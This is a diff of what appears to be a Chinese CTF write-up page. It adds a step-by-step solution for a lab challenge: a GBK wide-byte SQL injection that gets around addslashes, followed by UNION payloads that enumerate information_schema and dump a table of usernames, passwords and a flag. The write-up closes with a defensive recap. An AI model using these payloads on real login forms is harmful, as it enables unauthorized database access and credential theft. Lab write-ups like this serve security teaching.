@@ -1817,8 +1817,63 @@ env 或 printenv 才能看见。&lt;/p&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;提取全部 42 个字符，得到 &lt;code&gt;flag{eaaa6edb-1425-4cca-9060-4db595c17008}&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：这题的核心是&lt;strong&gt;时间盲注&lt;/strong&gt;——页面不显示查询数据，且布尔条件无响应差异，只能通过 &lt;code&gt;sleep()&lt;/code&gt; 函数的延迟来判断条件真假。与布尔盲注相比，时间盲注的每个请求都需要等待 sleep 时间，提取速度更慢。字符型注入需要用 &lt;code&gt;&#39;&lt;/code&gt; 闭合和 &lt;code&gt;#&lt;/code&gt; 注释。做 SQL 注入题遇到无数据显示且无布尔差异时，时间盲注是标准解法&lt;/p&gt;
-&lt;h3 id=&#34;ezsql_15&#34;&gt;EZSQL_15
-&lt;/h3&gt;&lt;h3 id=&#34;ezsql_16&#34;&gt;EZSQL_16
+&lt;h3 id=&#34;ezsql_15字符型-sql-注入---宽字节注入绕过-addslashes--union-联合查询注入&#34;&gt;EZSQL_15(字符型 SQL 注入 - 宽字节注入绕过 addslashes + UNION 联合查询注入)
+&lt;/h3&gt;&lt;p&gt;访问靶机，页面是一个登录表单，GET 方法提交 &lt;code&gt;username&lt;/code&gt; 和 &lt;code&gt;password&lt;/code&gt; 两个参数
+正常登录 &lt;code&gt;admin&lt;/code&gt; / &lt;code&gt;admin123&lt;/code&gt;，返回 &lt;code&gt;Welcome admin&lt;/code&gt;
+测试单引号注入 &lt;code&gt;admin&#39;#&lt;/code&gt;，返回 &lt;code&gt;Login failed.&lt;/code&gt;，没有报错。尝试各种注入 payload（&lt;code&gt;admin&#39;--+-&lt;/code&gt;、&lt;code&gt;admin&#39; or &#39;1&#39;=&#39;1&lt;/code&gt;、&lt;code&gt;admin&#39;#&lt;/code&gt;）全部返回 &lt;code&gt;Login failed.&lt;/code&gt;，说明后端对单引号做了转义处理（&lt;code&gt;addslashes()&lt;/code&gt; 或 &lt;code&gt;mysql_real_escape_string()&lt;/code&gt;）
+关键发现：&lt;code&gt;admin%bf&#39; or 1=1-- -&lt;/code&gt; 返回 &lt;code&gt;Welcome admin&lt;/code&gt;，说明存在&lt;strong&gt;宽字节注入（Wide-Byte Injection）&lt;/strong&gt;。原理是 &lt;code&gt;addslashes()&lt;/code&gt; 在单引号前添加反斜杠 &lt;code&gt;\&lt;/code&gt;（&lt;code&gt;%5c&lt;/code&gt;），而 &lt;code&gt;%bf%5c&lt;/code&gt; 在 GBK 编码中是一个合法的双字节字符，反斜杠被&amp;quot;吃掉&amp;quot;，单引号 &lt;code&gt;%27&lt;/code&gt; 逃逸出来
+确定列数，依次测试 1~8 列：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?username=-1%bf%27 union select 1,2,3,4-- -&amp;amp;password=x
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;4 列时返回 &lt;code&gt;Welcome 2&lt;/code&gt;，确认查询有 &lt;strong&gt;4 列&lt;/strong&gt;，回显位在第 2 列
+获取数据库名和版本：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?username=-1%bf%27 union select 1,database(),3,4-- -&amp;amp;password=x
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;数据库名为 &lt;code&gt;user&lt;/code&gt;，版本为 MariaDB 10.4.13
+枚举当前数据库的表：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?username=-1%bf%27 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()-- -&amp;amp;password=x
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;只有一张表：&lt;code&gt;flag&lt;/code&gt;
+查看 flag 表的列名（表名用十六进制 &lt;code&gt;0x666c6167&lt;/code&gt; 绕过单引号转义）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?username=-1%bf%27 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=0x666c6167-- -&amp;amp;password=x
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;四列：&lt;code&gt;id&lt;/code&gt;、&lt;code&gt;name&lt;/code&gt;、&lt;code&gt;passwd&lt;/code&gt;、&lt;code&gt;secret&lt;/code&gt;
+直接 dump flag 表：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?username=-1%bf%27 union select 1,group_concat(id,0x3a,name,0x3a,passwd,0x3a,secret),3,4 from flag-- -&amp;amp;password=x
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;返回 &lt;code&gt;1:admin:admin123:flag{6746fd7a-7c7e-4681-a63a-2aa67e5b3d80}&lt;/code&gt;，成功获得 flag&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：这题的核心是&lt;strong&gt;宽字节注入（Wide-Byte Injection）&lt;/strong&gt;。后端使用 &lt;code&gt;addslashes()&lt;/code&gt; 对单引号进行转义，但在 GBK 编码环境下，&lt;code&gt;%bf%5c&lt;/code&gt; 构成一个合法的双字节字符，吞掉了转义用的反斜杠，使单引号逃逸。绕过方式是在注入的单引号前添加 &lt;code&gt;%bf&lt;/code&gt;（或其他高字节如 &lt;code&gt;%81&lt;/code&gt;~&lt;code&gt;%fe&lt;/code&gt;）。防御时应使用 &lt;code&gt;mysql_set_charset()&lt;/code&gt; 设置字符集而非 &lt;code&gt;addslashes()&lt;/code&gt;，或统一使用参数化查询（Prepared Statements）&lt;/p&gt;
+&lt;h3 id=&#34;ezsql_16&#34;&gt;EZSQL_16
 &lt;/h3&gt;&lt;h3 id=&#34;ezsql_17&#34;&gt;EZSQL_17
 &lt;/h3&gt;&lt;h3 id=&#34;ezsql_18&#34;&gt;EZSQL_18
 &lt;/h3&gt;&lt;h3 id=&#34;ezsql_19&#34;&gt;EZSQL_19
